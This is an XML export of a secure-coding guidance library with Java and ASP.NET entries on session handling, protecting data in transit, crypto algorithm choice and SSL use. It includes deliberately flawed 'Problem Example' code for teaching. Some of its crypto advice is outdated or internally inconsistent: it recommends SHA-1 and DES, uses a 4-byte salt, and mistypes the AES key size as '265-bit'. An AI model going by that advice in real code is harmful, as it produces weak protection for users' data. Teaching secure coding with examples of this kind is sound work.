javax.servlet.http.*;&lt;br&gt; &lt;br&gt;public final class Auth extends HttpServlet{&lt;br&gt;      public void doGet(HttpServletRequest request,&lt;br&gt;              HttpServletResponse response) throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            HttpSession session = request.getSession(true);&lt;br&gt;            String redirectURL = &amp;quot;/myapp/main&amp;quot;;&lt;br&gt; &lt;br&gt;            //The application fails to check whether the client supports cookies&lt;br&gt;            ...&lt;br&gt; &lt;br&gt;            response.sendRedirect(redirectURL);&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code shows the login interaction between the application and the user. Once the user requests the initial page, the application forwards him to the login screen. Upon verifying the credentials, the application loads the main application interface.
 Fortunately, the application checks whether the client supports cookies; therefore, any user with disabled&amp;nbsp;cookies will still be able to use the application.
&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;%-- Filename: /myapp/index.jsp --%&amp;gt;&lt;br&gt;&amp;lt;%&lt;br&gt;// The application initiates a test that determines&lt;br&gt; &lt;br&gt;// whether cookies are enabledCookie&lt;br&gt; &lt;br&gt;testCookie = new Cookie(&amp;quot;&amp;quot;myappTestCookie&amp;quot;, &amp;quot;testVal&amp;quot;);&lt;br&gt;testCookie.setMaxAge(300);&lt;br&gt;response.addCookie(testCookie);%&amp;gt;&lt;br&gt;&amp;lt;jsp:forward page=&amp;quot;/myapp/login.jsp&amp;quot; /&amp;gt;&lt;br&gt; &lt;br&gt; &lt;br&gt;&amp;lt;%-- Filename: /myapp/login.jsp --%&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;::login&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/auth&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; size=&amp;quot;20&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;br&amp;gt;&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pass&amp;quot; size=&amp;quot;20&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;br&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt; &lt;br&gt; &lt;br&gt;/*  Filename: /myapp/auth  */&lt;br&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt; &lt;br&gt;public final class Auth extends HttpServlet{&lt;br&gt;      public void doGet(HttpServletRequest request,&lt;br&gt;              HttpServletResponse response) throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            HttpSession session = request.getSession(true);&lt;br&gt;            Cookie[] cookies = request.getCookies();&lt;br&gt;            String redirectURL = &amp;quot;/myapp/main&amp;quot;;&lt;br&gt;            boolean cookiesSupported = true;&lt;br&gt; &lt;br&gt;            ...&lt;br&gt; &lt;br&gt;            // The application checks if the test cookie is accepted by the client&lt;br&gt;            if (cookies.length &amp;lt; 1)&lt;br&gt;            {&lt;br&gt;                  cookiesSupported = false;&lt;br&gt;            }&lt;br&gt; &lt;br&gt;            ...&lt;br&gt; &lt;br&gt;            if (!cookiesSupported)&lt;br&gt;            {&lt;br&gt;                  redirectURL = response.encodeURL(redirectURL);&lt;br&gt;            }&lt;br&gt; &lt;br&gt;            response.sendRedirect(redirectURL);&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information on HTTP sessions, see: Documentation for &lt;a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/HttpSession.html"&gt;
Interface HttpSession&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;For more information on HTTP cookies, see: Documentation for &lt;a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/Cookie.html"&gt;
Class Cookie&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;For more information on HTTP responses, see: Documentation for &lt;a href="http://download.oracle.com/javaee/1.3/api/javax/servlet/http/HttpServletResponse.html"&gt;
Interface HttpServletResponse&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;To learn more about session management, see: &lt;a href="http://www.securityfocus.com/infocus/1774"&gt;
Basic Web Session Impersonation&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;To learn more about session prediction attacks, see: &lt;a href="http://www.webappsec.org/projects/threat/classes/credential_session_prediction.shtml"&gt;
Credential and Session Prediction&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:33D22944-96D4-4711-AE97-BD87A87463C9"&gt;Guideline: Do Not Place Sensitive Data in Parameters (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:3EB8979E-59F0-4C2B-8D8A-CFB173E5D66B"&gt;Attack: HTTP Session Hijacking Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:74F3AE96-F7AD-45A2-B8DE-008D23234123"&gt;Checklist Item: JSESSIONIDs are Stored in the URL When Cookies are Disabled (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a94e0193-b5ab-43e0-b6b1-8e7f0ce69206</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Protect Sensitive Data Over the Network</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Sensitive Data</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use encryption to protect sensitive data that is transmitted over the network.
&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Because network traffic&amp;nbsp;is easily eavesdropped on or modified by attackers, passing sensitive data as plaintext&amp;nbsp;over the network&amp;nbsp;can lead&amp;nbsp;to a host of attacks, including data theft and data manipulation.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Apply this guideline when your application transmits sensitive data over unprotected communication channels.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Use the following steps to protect sensitive data over the network:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify sensitive information. &lt;/strong&gt;Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued
 ID numbers, credit card and other financial information, passwords and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application,
 to identify sensitive data. Sensitive data can be defined as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others.
&lt;/li&gt;&lt;li&gt;Information that a user provides that they would not want shared with other users of the application.
&lt;/li&gt;&lt;li&gt;Information that comes from an external trusted source that is not designed to be shared with users.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Choose an appropriate protection mechanism. &lt;/strong&gt;Choosing the appropriate protection mechanism may depend on various conditions: purpose of the sensitive data, role of the other network party, infrastructure and supported technologies. Because
 sensitive data must be encrypted when in transit, there are two strategies, to encrypt the communication channel or to encrypt the application data:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt the communication channel&lt;/strong&gt;: Depending on the current infrastructure and the other network party, it is possible to encrypt the connections using Java's crypto library or any technologies supported by the remote party. For more information,
 consult the &lt;a href="?#ruledisplay:5E283FD0-1A55-4DC3-971D-BF7C3318E7CB"&gt;Encrypt Communication Links&lt;/a&gt; guideline.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypt the application data&lt;/strong&gt;: If your application's communication channels cannot be encrypted, encrypt the application data. Hashing or encryption should be used when protecting the application data. Use hashing if the application data
 will be used only for comparison purposes. Use encryption if the application data will be retrieved at a later stage.&lt;/p&gt;
&lt;p&gt;If hashing is used, choose a longer salt, 16 or more bits.&amp;nbsp;In the case&amp;nbsp;that the produced hash is compromised, longer salts make it more difficult for an attacker to gain access to the sensitive data. If your application uses randomly generated salt, make
 sure that your application encrypts the random salt and stores it into a configuration file. Always use
&lt;strong&gt;SecureRandom&lt;/strong&gt; and not &lt;strong&gt;Random&lt;/strong&gt; to generate the salt. Example of using
&lt;strong&gt;SecureRandom&lt;/strong&gt; to generate a random salt:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public static byte[] generateSalt() throws NoSuchAlgorithmException&lt;br&gt;{&lt;br&gt;      // Note that salt is declared as private static byte[] and is&lt;br&gt;      // initialized to null.&lt;br&gt;      if (salt == null)&lt;br&gt;      {&lt;br&gt;            SecureRandom srand = SecureRandom.getInstance(&amp;quot;SHA1PRNG&amp;quot;);&lt;br&gt;                          salt = new byte[4];&lt;br&gt;            srand.nextBytes(salt);&lt;br&gt;      }&lt;br&gt;       return salt;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Choosing a strong hashing algorithm is also important. Stronger algorithms prevent multiple unique pieces of data from producing identical hash values. The current recommendation is to use SHA-256 or stronger.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public String hashCredentials(char[] pass, byte[] salt)&lt;br&gt;      throws GeneralSecurityException, IOException&lt;br&gt;{&lt;br&gt;      MessageDigest md;&lt;br&gt;      byte[] tempPass;&lt;br&gt;      byte[] digest;&lt;br&gt;            md = MessageDigest.getInstance(&amp;quot;SHA-512&amp;quot;);&lt;br&gt;      //Convert char[] to byte[]&lt;br&gt;      tempPass = new byte[pass.length];&lt;br&gt;      for (int i = 0; i &amp;lt; pass.length; i&amp;#43;&amp;#43;)&lt;br&gt;      {&lt;br&gt;            tempPass[i] = (byte)pass[i];&lt;br&gt;      }&lt;br&gt;      md.update(tempPass);&lt;br&gt;      md.update(salt);&lt;br&gt;      digest = md.digest();&lt;br&gt;      md.reset();&lt;br&gt;      //Clean tempPass&lt;br&gt;      for (int i = 0; i &amp;lt; tempPass.length; i&amp;#43;&amp;#43;)&lt;br&gt;      {&lt;br&gt;            tempPass[i] = 0;&lt;br&gt;      }&lt;br&gt;       return new String(digest);&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Use encryption if the application data will be retrieved at a later stage.&lt;br&gt;
&lt;br&gt;
Use symmetric encryption if and only if your application is the only entity that will access the encrypted data. Use a key size of 265-bit or higher and AES for symmetric encryption.&lt;br&gt;
&lt;br&gt;
Use public/private key encryption if the data will be accessed by two or more parties. Use a key size of 2048-bit or higher and RSA for public/private key encryption. Public/private key encryption allows your application to share sensitive data with multiple
 entities without disclosing its own encryption key.&lt;/p&gt;
&lt;pre&gt;// Because the following code generates a new encryption key,&lt;br&gt;// make sure to store it into the application's keystore.&lt;br&gt;// Follow the &lt;a href="?#ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0"&gt;Use a Secure Key Storage Location&lt;/a&gt; guideline.&lt;br&gt;KeyGenerator kgen = KeyGenerator.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;kgen.init(256);&lt;br&gt;SecretKey skey = kgen.generateKey();&lt;br&gt;// Set up cipherCipher cipher = Cipher.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;cipher.init(Cipher.ENCRYPT_MODE, skey);&lt;br&gt;// Note that sensitiveData is of type byte[] and contains&lt;br&gt;// data that is sensitive in naturebyte[] encrypted = cipher.doFinal(sensitiveData);&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Apply the appropriate protection mechanism&lt;/strong&gt;. Evaluate the code and determine the places where sensitive data is transmitted. Apply the established protection mechanism at each location.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;try&lt;br&gt;{&lt;br&gt;      // The application produces a hash based on the sensitive data&lt;br&gt;      userEmail = MyApp.getEmailForUser(user);&lt;br&gt;      passDigest = encryptCredentials(userEmail, pass, salt);&lt;br&gt;}&lt;br&gt;catch (GeneralSecurityException gse)&lt;br&gt;{&lt;br&gt;      // Add the appropriate logging and exception handling mechanisms&lt;br&gt;      return false;}catch (IOException ioe)&lt;br&gt;{&lt;br&gt;      // Add the appropriate logging and exception handling mechanisms&lt;br&gt;      return false;&lt;br&gt;}&lt;br&gt;// The application stores the hashed sensitive data into the database&lt;br&gt;Connection cn = MyApp.getDBConnection();&lt;br&gt;PreparedStatement st = cn.prepareStatement(&amp;quot;select login_attempts from myappUsers&amp;quot;&lt;br&gt;                                        &amp;#43; &amp;quot; where user = ? and pass = ?;&amp;quot;);&lt;br&gt;st.setString(1, user);&lt;br&gt;st.setBytes(2, passDigest);&lt;br&gt;ResultSet rs = st.executeQuery();&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; PCI DSS requirements state that all sensitive data must be encrypted before being sent over the network or be sent over an encrypted channel.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code authenticates a user based on a username and password. The supplied credentials are compared to the credentials stored in the backend database. Unfortunately, the credentials are transmitted in plaintext and could be stolen if the network
 is compromised.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      // Query the credential store with the provided credentials&lt;br&gt;      ...&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following code validates the user based on&amp;nbsp;a given username and password. It uses the user's valid email address and a random salt to encrypt the user's password before comparing&amp;nbsp;the username and the produced digest against the data stored in the backend
 database. Therefore, the password is encrypted before being transmitted over the network and is protected from being compromised.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;       ...&lt;br&gt;       // Encrypt the credentials&lt;br&gt;      try&lt;br&gt;      {&lt;br&gt;            userEmail = MyApp.getEmailForUser(user);&lt;br&gt;            passDigest = encryptCredentials(userEmail, pass, salt);&lt;br&gt;      }&lt;br&gt;      catch (GeneralSecurityException gse)&lt;br&gt;      {&lt;br&gt;            // Add the appropriate logging and exception handling mechanisms&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;     catch (IOException ioe)&lt;br&gt;      {&lt;br&gt;            // Add the appropriate logging and exception handling mechanisms&lt;br&gt;            return false;&lt;br&gt;      }&lt;br&gt;       // Query the credential store and execute the rest of the authentication steps&lt;br&gt;      ...&lt;br&gt;}&lt;br&gt;public static byte[] encryptCredentials(String email, char[] pass, byte[] salt)&lt;br&gt;      throws GeneralSecurityException, IOException&lt;br&gt;{&lt;br&gt;      MessageDigest md; &lt;br&gt;      byte[] tempPass;&lt;br&gt;      byte[] rawKey;&lt;br&gt;      // Generate encryption key&lt;br&gt;      md = MessageDigest.getInstance(&amp;quot;SHA-512&amp;quot;);&lt;br&gt;      md.update(email.getBytes(&amp;quot;UTF-8&amp;quot;));&lt;br&gt;      md.update(salt);&lt;br&gt;      rawKey = md.digest();&lt;br&gt;      md.reset();&lt;br&gt;      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, &amp;quot;AES&amp;quot;);&lt;br&gt;      // Set up cipher&lt;br&gt;      Cipher cipher = Cipher.getInstance(&amp;quot;AES&amp;quot;);&lt;br&gt;      cipher.init(Cipher.ENCRYPT_MODE, skeySpec);&lt;br&gt;      // Convert char[] to byte[]&lt;br&gt;      tempPass = new byte[pass.length];&lt;br&gt;      for (int i = 0; i &amp;lt; pass.length; i&amp;#43;&amp;#43;)&lt;br&gt;      {&lt;br&gt;            tempPass[i] = (byte)pass[i];&lt;br&gt;      }&lt;br&gt;      // Encrypt password&lt;br&gt;      byte[] encrypted = cipher.doFinal(tempPass);&lt;br&gt;            //Clean tempPass&lt;br&gt;      for (int i = 0; i &amp;lt; tempPass.length; i&amp;#43;&amp;#43;)&lt;br&gt;      {&lt;br&gt;            tempPass[i] = 0;&lt;br&gt;      }&lt;br&gt;      return encrypted;&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about the JCE API, see: &lt;a href="http://java.sun.com/products/jce/index-14.html"&gt;
Java Cryptography Extension for the Java 2 SDK, v 1.4&lt;/a&gt;. &lt;/li&gt;&lt;li&gt;For more information about securely generating random numbers, see: Documentation for
&lt;a href="http://download.oracle.com/javase/1.4.2/docs/api/java/security/SecureRandom.html"&gt;
Class SecureRandom&lt;/a&gt; in Java SDK. &lt;/li&gt;&lt;li&gt;To learn more about JSSE, see: &lt;a href="http://java.sun.com/j2se/1.4.2/docs/guide/security/jsse/JSSERefGuide.html"&gt;
Java Secure Socket Extension (JSSE) Reference Guide&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:5E283FD0-1A55-4DC3-971D-BF7C3318E7CB"&gt;Guideline: Encrypt Communication Links (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0"&gt;Guideline: Use a Secure Key Storage Location (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073"&gt;Guideline: Use SSL When Transmitting Credentials (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035"&gt;Attack: Network Eavesdropping Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D"&gt;Attack: Man in the Middle Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04"&gt;Attack: Traffic Analysis Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9"&gt;Attack: Information Disclosure Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828"&gt;Attack: Network Credential Sniffing Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:92148CDE-33B9-4725-882F-0C2C245510BA"&gt;Checklist Item: Sensitive Data is Protected Over the Network (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>a99bebe3-80cb-489d-90f3-6f6d35f23dc0</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use the Correct Algorithm and Correct Key Size</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Cryptography</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Examine what algorithms your application uses and for what purpose and ensure that correct algorithm and correct key sizes are being used.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Cryptography only provides real security if it is used appropriately and the right algorithms are used for the right job. The strength of the algorithm is also important.&amp;nbsp; Larger key sizes result in improved security, but performance suffers. Stronger encryption
 is most important for persisted data that is retained in data stores for prolonged periods of time.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses cryptography to provide security, examine what algorithm and key size it uses and the way it is used.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;It is important to make sure you choose the right algorithm for the right job and to make sure you use a key size that provides a sufficient degree of security. Larger key sizes generally increase security. The following list summarizes the major algorithms
 together with the key sizes that each uses: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Data Encryption Standard (DES) 64-bit key (8 bytes) &lt;/li&gt;&lt;li&gt;TripleDES 128-bit key or 192-bit key (16 or 24 bytes) &lt;/li&gt;&lt;li&gt;Rijndael 128-256 bit keys (16-32 bytes) &lt;/li&gt;&lt;li&gt;RSA 384-16,384 bit keys (48-2,048 bytes) &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For large data encryption, use the TripleDES symmetric encryption algorithm (also&amp;nbsp;called Triple Data Encryption Algorithm, TDEA) . For slower and stronger encryption of large data, use Rijndael,&amp;nbsp;also known as Advanced Encryption Standard(AES). As per NIST&amp;nbsp;recomendations,
 192-256-bit AES&amp;nbsp;keys are required for highly sensitive data.&amp;nbsp;&amp;nbsp;To encrypt data that is to be stored for short periods of time, you can consider using a faster but weaker algorithm such as DES. For digital signatures, use Rivest, Shamir, and Adleman (RSA) or
 Digital Signature Algorithm (DSA). NIST guidelines suggest that 15360-bit RSA keys are equivalent&amp;nbsp;to 256-bit symmetric keys in strength. For hashing, use the Secure Hash Algorithm (SHA)1.0. For keyed hashes, use the Hash-based Message Authentication Code (HMAC)
 SHA1.0.&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information see, &amp;quot;Chapter 4 - Design Guidelines for Secure Web Applications&amp;quot; at
&lt;a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx"&gt;http://msdn2.microsoft.com/en-us/library/aa302420.aspx&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>aa4270d8-cebf-4d7b-8044-08713aaf5888</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Optimize Pages that use SSL</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Use SSL only for pages that require it. &lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using SSL is expensive in terms of performance. &lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;Use SSL for pages that contain or capture sensitive data, such as pages that accept credit card numbers and passwords. Use SSL only if the following conditions are true:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You want to encrypt the page data. &lt;/li&gt;&lt;li&gt;You want to guarantee that the server to which you send the data is the server that you expect.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;For pages where you must use SSL, follow these guidelines: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make the page size as small as possible. &lt;/li&gt;&lt;li&gt;Avoid using graphics that have large file sizes. If you use graphics, use graphics that have smaller file sizes and resolution. Or, use graphics from a site that is not secure. However, when you use graphics from a site that is not secure, Web browsers
 display a dialog box that asks the user if the user wants to display the content from the site that is not secure.
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3"&gt;Use IPSsec to Encrypt Traffic Between Servers&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:de1299b9-854b-4479-9f26-bbc9df38af29"&gt;Use SSL or IPSec for Secure Communication Between Entities&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:00b37bcb-5a47-41ca-9e84-a9e8edb15272"&gt;Use SSL Between the Web Browser and Web Server When Pages Need to be Encrypted&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>acae9e9a-f11e-4957-af5c-24235cd47f96</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Consider Partitioning Your Site to Restricted Areas and Public Areas</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;To avoid the performance overhead of using SSL across your entire site, consider using a separate folder to help protect pages that require authenticated access. Configure that folder in IIS to require SSL access. Those pages that support anonymous access
 can safely be accessed over HTTP connections.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Using SSL across an entire site can incur a significant performance penalty. For sites that have pages which may be viewed without encryption or authentication, it will improve performance to separate out restricted from non-restricted pages.
&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;This technique should be employed whenever an application has a mix of pages - some of which require authentication while others don't.
&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To avoid having to use SSL across your entire site, structure your Web site so that the secure pages that require authenticated access are placed in a subdirectory that is separate from the anonymously accessible pages.&amp;nbsp;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To secure pages in a separate subfolder&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;In Microsoft Internet Information Services (IIS), configure the secure folder to require SSL. This sets the
&lt;strong&gt;AccessSSL=true&lt;/strong&gt; attribute for the folder in the IIS Metabase. Requests for pages in the secured folders are successful only if HTTPS is used for the request URL.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;Use an &amp;lt;&lt;strong&gt;authorization&lt;/strong&gt;&amp;gt; element to ensure that only authenticated users can access secure pages. Place this element beneath the closing &amp;lt;&lt;strong&gt;/system.web&lt;/strong&gt;&amp;gt; tag, as shown here.
&lt;/p&gt;
&lt;pre&gt;&amp;lt;!-- The secure folder is for authenticated and SSL access only. --&amp;gt;&lt;br&gt;&amp;lt;location path=&amp;quot;Secure&amp;quot; &amp;gt;&lt;br&gt;  &amp;lt;system.web&amp;gt;&lt;br&gt;    &amp;lt;authorization&amp;gt;&lt;br&gt;      &amp;lt;deny users=&amp;quot;?&amp;quot; /&amp;gt;&lt;br&gt;    &amp;lt;/authorization&amp;gt;&lt;br&gt;  &amp;lt;/system.web&amp;gt;&lt;br&gt;&amp;lt;/location&amp;gt;  &lt;/pre&gt;
